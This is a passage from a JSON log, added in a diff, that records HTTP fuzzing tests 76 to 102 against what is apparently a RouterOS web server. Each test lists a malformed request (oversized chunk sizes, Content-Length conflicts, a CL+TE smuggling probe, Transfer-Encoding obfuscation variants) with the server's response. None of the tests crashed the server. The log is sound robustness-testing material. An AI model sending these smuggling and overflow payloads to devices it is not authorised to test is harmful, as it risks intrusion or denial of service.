+      "id": 76,
+      "category": "chunked_encoding",
+      "name": "Oversized chunk size hex (FFFFF)",
+      "description": "Send chunked request with very large chunk size declaration",
+      "result": "Response: HTTP/1.1 501 Not Implemented (329 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:50.493373",
+      "details": {
+        "payload_size": 108,
+        "payload_preview": "POST / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\nFFFFF\r\nAAAAAAAAAA\r\n0\r\n\r\n",
+        "response_preview": "HTTP/1.1 501 Not Implemented\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 111\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:45 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 501 : Not Implemented</title>\n<h1>Error 501 : Not Implemented</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m28s",
+        "uptime_after": "2h5m28s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 77,
+      "category": "chunked_encoding",
+      "name": "Negative chunk size (-1)",
+      "description": "Send chunked request with negative chunk size",
+      "result": "Response: HTTP/1.1 501 Not Implemented (329 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:51.309781",
+      "details": {
+        "payload_size": 99,
+        "payload_preview": "POST / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n-1\r\ndata\r\n0\r\n\r\n",
+        "response_preview": "HTTP/1.1 501 Not Implemented\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 111\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:46 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 501 : Not Implemented</title>\n<h1>Error 501 : Not Implemented</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m28s",
+        "uptime_after": "2h5m29s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 78,
+      "category": "chunked_encoding",
+      "name": "Multiple zero-length chunks",
+      "description": "Send chunked request with 50 zero-length chunks",
+      "result": "Response: HTTP/1.1 501 Not Implemented (329 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:52.126189",
+      "details": {
+        "payload_size": 334,
+        "payload_preview": "POST / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0\r\n\r\n0... [truncated, total 334 chars]",
+        "response_preview": "HTTP/1.1 501 Not Implemented\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 111\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:47 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 501 : Not Implemented</title>\n<h1>Error 501 : Not Implemented</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m29s",
+        "uptime_after": "2h5m30s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 79,
+      "category": "chunked_encoding",
+      "name": "Chunk size integer overflow (FFFFFFFF)",
+      "description": "Send chunked request with 0xFFFFFFFF chunk size (4GB)",
+      "result": "Response: HTTP/1.1 501 Not Implemented (329 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:52.930591",
+      "details": {
+        "payload_size": 111,
+        "payload_preview": "POST / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\nFFFFFFFF\r\nsmall data\r\n0\r\n\r\n",
+        "response_preview": "HTTP/1.1 501 Not Implemented\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 111\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:48 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 501 : Not Implemented</title>\n<h1>Error 501 : Not Implemented</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m30s",
+        "uptime_after": "2h5m30s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 80,
+      "category": "chunked_encoding",
+      "name": "Chunk extension with long value",
+      "description": "Send chunk size line with oversized extension parameter",
+      "result": "Response: HTTP/1.1 501 Not Implemented (329 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:53.738995",
+      "details": {
+        "payload_size": 4200,
+        "payload_preview": "POST / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n5;ext=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx... [truncated, total 4200 chars]",
+        "response_preview": "HTTP/1.1 501 Not Implemented\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 111\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:49 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 501 : Not Implemented</title>\n<h1>Error 501 : Not Implemented</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m31s",
+        "uptime_after": "2h5m31s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 81,
+      "category": "content_length",
+      "name": "Content-Length larger than body",
+      "description": "Send Content-Length: 10000 with only 10 bytes of body",
+      "result": "Response: HTTP/1.1 501 Not Implemented (329 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:54.551401",
+      "details": {
+        "payload_size": 89,
+        "payload_preview": "POST / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nContent-Length: 10000\r\nConnection: close\r\n\r\nshort body",
+        "response_preview": "HTTP/1.1 501 Not Implemented\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 111\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:49 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 501 : Not Implemented</title>\n<h1>Error 501 : Not Implemented</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m32s",
+        "uptime_after": "2h5m32s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 82,
+      "category": "content_length",
+      "name": "Negative Content-Length (-1)",
+      "description": "Send Content-Length: -1 with a small body",
+      "result": "Response: HTTP/1.1 501 Not Implemented (329 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:55.367809",
+      "details": {
+        "payload_size": 85,
+        "payload_preview": "POST / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nContent-Length: -1\r\nConnection: close\r\n\r\nbody data",
+        "response_preview": "HTTP/1.1 501 Not Implemented\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 111\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:50 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 501 : Not Implemented</title>\n<h1>Error 501 : Not Implemented</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m33s",
+        "uptime_after": "2h5m33s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 83,
+      "category": "content_length",
+      "name": "Content-Length MAX_INT (2147483647)",
+      "description": "Send Content-Length set to 2^31-1 with small body",
+      "result": "Response: HTTP/1.1 501 Not Implemented (329 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:56.184217",
+      "details": {
+        "payload_size": 88,
+        "payload_preview": "POST / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nContent-Length: 2147483647\r\nConnection: close\r\n\r\ntiny",
+        "response_preview": "HTTP/1.1 501 Not Implemented\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 111\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:51 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 501 : Not Implemented</title>\n<h1>Error 501 : Not Implemented</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m33s",
+        "uptime_after": "2h5m34s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 84,
+      "category": "content_length",
+      "name": "Content-Length: 0 with body",
+      "description": "Send Content-Length: 0 but include a body payload",
+      "result": "Response: HTTP/1.1 501 Not Implemented (329 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:56.992621",
+      "details": {
+        "payload_size": 117,
+        "payload_preview": "POST / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nContent-Length: 0\r\nConnection: close\r\n\r\nThis body should be ignored but may not be",
+        "response_preview": "HTTP/1.1 501 Not Implemented\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 111\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:52 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 501 : Not Implemented</title>\n<h1>Error 501 : Not Implemented</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m34s",
+        "uptime_after": "2h5m34s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 85,
+      "category": "content_length",
+      "name": "No Content-Length, body present",
+      "description": "Send POST with body but no Content-Length or Transfer-Encoding",
+      "result": "Response: HTTP/1.1 501 Not Implemented (329 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:57.809029",
+      "details": {
+        "payload_size": 86,
+        "payload_preview": "POST / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nConnection: close\r\n\r\nbody without length indication",
+        "response_preview": "HTTP/1.1 501 Not Implemented\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 111\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:53 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 501 : Not Implemented</title>\n<h1>Error 501 : Not Implemented</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m35s",
+        "uptime_after": "2h5m35s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 86,
+      "category": "content_length",
+      "name": "Duplicate Content-Length headers",
+      "description": "Send two Content-Length headers with different values",
+      "result": "Response: HTTP/1.1 501 Not Implemented (329 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:58.625437",
+      "details": {
+        "payload_size": 101,
+        "payload_preview": "POST / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nContent-Length: 5\r\nContent-Length: 100\r\nConnection: close\r\n\r\nhello",
+        "response_preview": "HTTP/1.1 501 Not Implemented\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 111\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:53 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 501 : Not Implemented</title>\n<h1>Error 501 : Not Implemented</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m36s",
+        "uptime_after": "2h5m36s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 87,
+      "category": "edge_cases",
+      "name": "CL+TE conflict (smuggling)",
+      "description": "Send both Content-Length and Transfer-Encoding headers",
+      "result": "Response: HTTP/1.1 501 Not Implemented (329 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:59.445847",
+      "details": {
+        "payload_size": 108,
+        "payload_preview": "POST / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n0\r\n\r\n",
+        "response_preview": "HTTP/1.1 501 Not Implemented\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 111\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:54 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 501 : Not Implemented</title>\n<h1>Error 501 : Not Implemented</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m37s",
+        "uptime_after": "2h5m37s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 88,
+      "category": "edge_cases",
+      "name": "TE obfuscation: TE standard",
+      "description": "Test Transfer-Encoding header variant: TE standard",
+      "result": "Response: HTTP/1.1 501 Not Implemented (329 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:00.270259",
+      "details": {
+        "payload_size": 99,
+        "payload_preview": "POST / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n5\r\nhello\r\n0\r\n\r\n",
+        "response_preview": "HTTP/1.1 501 Not Implemented\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 111\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:55 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 501 : Not Implemented</title>\n<h1>Error 501 : Not Implemented</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m37s",
+        "uptime_after": "2h5m38s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 89,
+      "category": "edge_cases",
+      "name": "TE obfuscation: TE extra space",
+      "description": "Test Transfer-Encoding header variant: TE extra space",
+      "result": "Response: HTTP/1.1 501 Not Implemented (329 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:01.090669",
+      "details": {
+        "payload_size": 100,
+        "payload_preview": "POST / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nTransfer-Encoding:  chunked\r\nConnection: close\r\n\r\n5\r\nhello\r\n0\r\n\r\n",
+        "response_preview": "HTTP/1.1 501 Not Implemented\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 111\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:56 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 501 : Not Implemented</title>\n<h1>Error 501 : Not Implemented</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m38s",
+        "uptime_after": "2h5m39s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 90,
+      "category": "edge_cases",
+      "name": "TE obfuscation: TE capitalized",
+      "description": "Test Transfer-Encoding header variant: TE capitalized",
+      "result": "Response: HTTP/1.1 501 Not Implemented (329 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:01.907077",
+      "details": {
+        "payload_size": 99,
+        "payload_preview": "POST / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nTransfer-Encoding: Chunked\r\nConnection: close\r\n\r\n5\r\nhello\r\n0\r\n\r\n",
+        "response_preview": "HTTP/1.1 501 Not Implemented\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 111\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:57 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 501 : Not Implemented</title>\n<h1>Error 501 : Not Implemented</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m39s",
+        "uptime_after": "2h5m39s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 91,
+      "category": "edge_cases",
+      "name": "TE obfuscation: TE uppercase",
+      "description": "Test Transfer-Encoding header variant: TE uppercase",
+      "result": "Response: HTTP/1.1 501 Not Implemented (329 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:02.723485",
+      "details": {
+        "payload_size": 99,
+        "payload_preview": "POST / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nTransfer-Encoding: CHUNKED\r\nConnection: close\r\n\r\n5\r\nhello\r\n0\r\n\r\n",
+        "response_preview": "HTTP/1.1 501 Not Implemented\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 111\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:58 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 501 : Not Implemented</title>\n<h1>Error 501 : Not Implemented</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m40s",
+        "uptime_after": "2h5m40s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 92,
+      "category": "edge_cases",
+      "name": "TE obfuscation: TE space before colon",
+      "description": "Test Transfer-Encoding header variant: TE space before colon",
+      "result": "Response: HTTP/1.1 501 Not Implemented (329 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:03.535891",
+      "details": {
+        "payload_size": 100,
+        "payload_preview": "POST / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nTransfer-Encoding : chunked\r\nConnection: close\r\n\r\n5\r\nhello\r\n0\r\n\r\n",
+        "response_preview": "HTTP/1.1 501 Not Implemented\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 111\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:58 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 501 : Not Implemented</title>\n<h1>Error 501 : Not Implemented</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m41s",
+        "uptime_after": "2h5m41s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 93,
+      "category": "edge_cases",
+      "name": "TE obfuscation: TE double",
+      "description": "Test Transfer-Encoding header variant: TE double",
+      "result": "Response: HTTP/1.1 501 Not Implemented (329 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:04.348297",
+      "details": {
+        "payload_size": 128,
+        "payload_preview": "POST / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\nConnection: close\r\n\r\n5\r\nhello\r\n0\r\n\r\n",
+        "response_preview": "HTTP/1.1 501 Not Implemented\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 111\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:59 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 501 : Not Implemented</title>\n<h1>Error 501 : Not Implemented</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m42s",
+        "uptime_after": "2h5m42s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 94,
+      "category": "edge_cases",
+      "name": "TE obfuscation: TE tab separator",
+      "description": "Test Transfer-Encoding header variant: TE tab separator",
+      "result": "Response: HTTP/1.1 501 Not Implemented (329 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:05.192719",
+      "details": {
+        "payload_size": 99,
+        "payload_preview": "POST / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nTransfer-Encoding:\tchunked\r\nConnection: close\r\n\r\n5\r\nhello\r\n0\r\n\r\n",
+        "response_preview": "HTTP/1.1 501 Not Implemented\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 111\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:00 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 501 : Not Implemented</title>\n<h1>Error 501 : Not Implemented</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m42s",
+        "uptime_after": "2h5m43s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 95,
+      "category": "edge_cases",
+      "name": "TE obfuscation: TE lowercase name",
+      "description": "Test Transfer-Encoding header variant: TE lowercase name",
+      "result": "Response: HTTP/1.1 501 Not Implemented (329 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:06.005125",
+      "details": {
+        "payload_size": 99,
+        "payload_preview": "POST / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nTransfer-encoding: chunked\r\nConnection: close\r\n\r\n5\r\nhello\r\n0\r\n\r\n",
+        "response_preview": "HTTP/1.1 501 Not Implemented\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 111\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:01 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 501 : Not Implemented</title>\n<h1>Error 501 : Not Implemented</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m43s",
+        "uptime_after": "2h5m43s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 96,
+      "category": "edge_cases",
+      "name": "TE obfuscation: TE mixed case name",
+      "description": "Test Transfer-Encoding header variant: TE mixed case name",
+      "result": "Response: HTTP/1.1 501 Not Implemented (329 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:06.825535",
+      "details": {
+        "payload_size": 99,
+        "payload_preview": "POST / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nTrAnSfEr-EnCoDiNg: chunked\r\nConnection: close\r\n\r\n5\r\nhello\r\n0\r\n\r\n",
+        "response_preview": "HTTP/1.1 501 Not Implemented\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 111\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:02 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 501 : Not Implemented</title>\n<h1>Error 501 : Not Implemented</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m44s",
+        "uptime_after": "2h5m44s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 97,
+      "category": "edge_cases",
+      "name": "Header line folding (obs-fold)",
+      "description": "Use obsolete HTTP header line folding with leading whitespace",
+      "result": "Response: HTTP/1.0 400 Bad Request (322 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:12.658794",
+      "details": {
+        "payload_size": 112,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nX-Folded: first-part\r\n second-part\r\n\tcontinued-with-tab\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:02 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m45s",
+        "uptime_after": "2h5m50s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 98,
+      "category": "edge_cases",
+      "name": "HTTP/0.9 request",
+      "description": "Send HTTP/0.9 style request (just method and path, no version)",
+      "result": "Response: HTTP/1.0 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:13.514366",
+      "details": {
+        "payload_size": 7,
+        "payload_preview": "GET /\r\n",
+        "response_preview": "HTTP/1.0 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:08 GMT\r\nExpires: Tue, 16 Feb 2027 21:45:08 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h5m51s",
+        "uptime_after": "2h5m51s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 99,
+      "category": "edge_cases",
+      "name": "HTTP/2.0 version",
+      "description": "Send request with HTTP/2.0 version string",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:14.349948",
+      "details": {
+        "payload_size": 55,
+        "payload_preview": "GET / HTTP/2.0\r\nHost: [REDACTED-INTERNAL-IP]\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:09 GMT\r\nExpires: Tue, 16 Feb 2027 21:45:09 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h5m52s",
+        "uptime_after": "2h5m52s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 100,
+      "category": "edge_cases",
+      "name": "HTTP/3.0 version",
+      "description": "Send request with HTTP/3.0 version string",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:15.161542",
+      "details": {
+        "payload_size": 55,
+        "payload_preview": "GET / HTTP/3.0\r\nHost: [REDACTED-INTERNAL-IP]\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:10 GMT\r\nExpires: Tue, 16 Feb 2027 21:45:10 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h5m52s",
+        "uptime_after": "2h5m53s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 101,
+      "category": "edge_cases",
+      "name": "No space before HTTP version",
+      "description": "Malformed request line: No space before HTTP version",
+      "result": "Response: HTTP/1.0 404 Not Found (310 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:15.977134",
+      "details": {
+        "payload_size": 35,
+        "payload_preview": "GET /HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\n\r\n",
+        "response_preview": "HTTP/1.0 404 Not Found\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 99\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:45:11 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m53s",
+        "uptime_after": "2h5m53s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 102,
+      "category": "edge_cases",
+      "name": "Double space before path",
+      "description": "Malformed request line: Double space before path",
+      "result": "Response: HTTP/1.1 200 OK (1509 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:05:21.811020",
+      "details": {
+        "payload_size": 37,
+        "payload_preview": "GET  / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\n\r\n",
